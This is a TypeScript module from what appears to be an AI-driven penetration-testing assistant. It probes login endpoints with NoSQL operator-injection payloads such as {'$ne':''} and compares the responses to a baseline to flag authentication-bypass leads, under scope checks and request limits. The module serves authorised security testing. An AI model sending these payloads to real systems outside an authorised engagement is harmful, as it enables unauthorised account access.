// nosqlHunt.ts — NoSQL injection prover (write/confirm tool `nosql_hunt`).
//
// Two surfaces, both bounded and honest:
// 1. OPERATOR injection: JSON `{"user":{"$ne":""}}` / `{"pass":{"$gt":null}}` /
//    `{"pass":{"$regex":"^a"}}` against login/endpoint bodies — a DIFFERENT
//    outcome from the invalid-credential baseline (200/302/redirect vs 401)
//    is an auth-bypass LEAD. `error/500` alone is a weaker INFO signal.
// 2. ERROR fingerprint: operator echoed into a query the server cannot parse →
//    Mongo/BSON error text in the response marks the endpoint as NoSQL-backed
//    (fingerprint, not a finding by itself).
//
// Scope-gated via targetAllowed, ≤12 requests, polite delay. Pure helpers
// exported for unit tests. A lead is a SIGNAL — the model verifies
// determinism via poc_verify before finding_add (CWE-943).
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";

const UA = "mia-assistant/1.0";

async function postProbe(url: string, body: string, opts: { session?: string; rawUser?: unknown; method?: string } = {}): Promise<{ status: number; body: string; location: string; ms: number; error?: string }> {
  const headers: Record<string, string> = { "User-Agent": UA, "content-type": "application/json" };
  if (opts.session && opts.rawUser) {
    const s = sessionHeaders(opts.rawUser, opts.session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers.cookie = s.cookie;
    }
  }
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method: opts.method || "POST", headers, body, redirect: "manual", signal: AbortSignal.timeout(12_000) });
    return { status: res.status, body: (await res.text()).slice(0, 6000), location: res.headers.get("location") || "", ms: Date.now() - t0 };
  } catch (e) {
    return { status: 0, body: "", location: "", ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

// ── Pure helpers (unit-tested) ──────────────────────────────────────────────

export type NosqlCase = { name: string; body: string; kind: "operator" | "syntax" };

/**
 * Build operator-injection JSON bodies around the two field names. Pure.
 * `fields` default ["user","pass","username","password","email","id"].
 */
export function operatorBodies(fields: string[]): NosqlCase[] {
  const f = (fields.length ? fields : ["user", "pass"]).slice(0, 4);
  const cases: NosqlCase[] = [];
  for (const name of f) {
    cases.push({ name: `${name}.$ne`, kind: "operator", body: JSON.stringify({ [name]: { $ne: "" } }) });
    cases.push({ name: `${name}.$gt`, kind: "operator", body: JSON.stringify({ [name]: { $gt: null } }) });
    cases.push({ name: `${name}.$regex`, kind: "operator", body: JSON.stringify({ [name]: { $regex: "^.*" } }) });
    cases.push({ name: `${name}.nested`, kind: "syntax", body: JSON.stringify({ [name]: { field: { $ne: 1 } } }) });
  }
  return cases.slice(0, 12);
}

/** Extract the placeholder URL param value (`?x[$ne]=` style) for GET probes. Pure. */
export function getParamPayload(param: string): string {
  return `${param}[$ne]=`;
}

const MONGO_ERR_RE = /BSONError|BSONTypeError|MongoError|CastError|SyntaxError|Unexpected token \$|invalid.{0,20}(operator|query)|canon(?:ical)?\s*typeerror|\$ne|\$regex|\$where|ECONNRESET\s*at\s*Mongo/i;

/** Does a response body carry a Mongo/BSON fingerprint? Pure. */
export function mongoFingerprint(body: string): string | null {
  const m = MONGO_ERR_RE.exec(body || "");
  return m ? m[0].slice(0, 60) : null;
}

/**
 * Outcome classification vs the invalid-credential baseline. Pure.
 * - `lead`: auth bypass candidate (status/redirect differs from baseline in a
 *   success-ish direction, and NOT a raw error).
 * - `info`: server stumbled (error/500) — weaker signal.
 * - `none`: same as baseline.
 */
export function classifyOutcome(baseline: { status: number; location: string }, hit: { status: number; location: string; body: string }): "lead" | "info" | "none" {
  if (baseline.status === 0 || hit.status === 0) return "none";
  const successish = (s: number, loc: string) => (s >= 200 && s < 300) || (s >= 300 && s < 400 && !!loc);
  if (successish(hit.status, hit.location) && !successish(baseline.status, baseline.location)) return "lead";
  if (hit.status >= 500) return "info";
  if (hit.status !== baseline.status && mongoFingerprint(hit.body)) return "info";
  return "none";
}

// ── Runner ──────────────────────────────────────────────────────────────────

export async function nosqlHunt(
  rawUser: unknown,
  opts: { url?: string; fields?: string; session?: string; method?: string }
): Promise<string> {
  const url = (opts.url || "").trim();
  if (!url) return "Error: url wajib (endpoint login/query, mis. https://host/api/login).";
  if (!/^https?:\/\//i.test(url)) return "Error: url harus http(s).";
  if (!targetAllowed(url)) return "Error: SCOPE — nosql_hunt hanya untuk lab / engagement aktif.";
  const method = (opts.method || "POST").toUpperCase();
  const fields = (opts.fields || "").split(/[,\s]+/).map((s) => s.trim()).filter(Boolean);
  const session = (opts.session || "").trim();

  const lines: string[] = [`🧲 NoSQL HUNT — ${method} ${url.slice(0, 100)}`];

  // Baseline: an INVALID credential body — the "what does failure look like" anchor.
  const baseFields = fields.length ? fields : ["username", "password"];
  const baseBody = JSON.stringify(Object.fromEntries(baseFields.slice(0, 2).map((f, i) => [f, i === 0 ? "mia_probe_user" : "mia_probe_pass_invalid"])));
  const baseline = await postProbe(url, baseBody, { session: session || undefined, rawUser, method });
  if (baseline.error) return `Error: baseline — ${baseline.error}`;
  recordHttp(rawUser, { method, url, status: baseline.status, bytes: baseline.body.length, ms: baseline.ms, at: new Date().toISOString() });
  await politeDelay();
  lines.push(`baseline kredensial salah: ${baseline.status}${baseline.location ? ` → ${baseline.location.slice(0, 60)}` : ""} (${baseline.ms}ms)`);

  const cases = operatorBodies(fields);
  const leads: { c: NosqlCase; hit: { status: number; location: string; body: string } }[] = [];
  const infos: string[] = [];

  for (const c of cases) {
    const hit = await postProbe(url, c.body, { session: session || undefined, rawUser, method });
    recordHttp(rawUser, { method, url, status: hit.status, bytes: hit.body.length, ms: hit.ms, at: new Date().toISOString() });
    await politeDelay();
    const fp = mongoFingerprint(hit.body);
    const cls = classifyOutcome(baseline, hit);
    if (cls === "lead") leads.push({ c, hit });
    else if (cls === "info" || fp) infos.push(`• ${c.name}: ${hit.status}${fp ? ` — ${fp}` : ""}`);
    if (leads.length >= 3) break; // bounded
  }

  if (infos.length) {
    lines.push("", "fingerprint:");
    lines.push(...infos.slice(0, 4));
  }
  if (!leads.length) {
    lines.push("", "Tidak ada auth-bypass lead: outcome operator injection sama dengan baseline (atau hanya error). Endpoint mungkin tidak rentan operator injection — coba surface lain (syntax error → fingerprint di atas).");
    return lines.join("\n");
  }

  lines.push("", `🎯 NOSQL AUTH-BYPASS LEAD (${leads.length}):`);
  for (const l of leads) {
    lines.push(`• body: ${l.c.body.slice(0, 120)}`);
    lines.push(`  → ${l.hit.status}${l.hit.location ? ` → ${l.hit.location.slice(0, 60)}` : ""} (baseline ${baseline.status})`);
  }
  lines.push("");
  lines.push("⚠️ SINYAL — bukan bukti. Verifikasi: ulangi manual, cek sesi/cookie yang diberikan, lalu `poc_verify` sebelum `finding_add` (CWE-943, OWASP A03).");
  return lines.join("\n").slice(0, 9000);
}
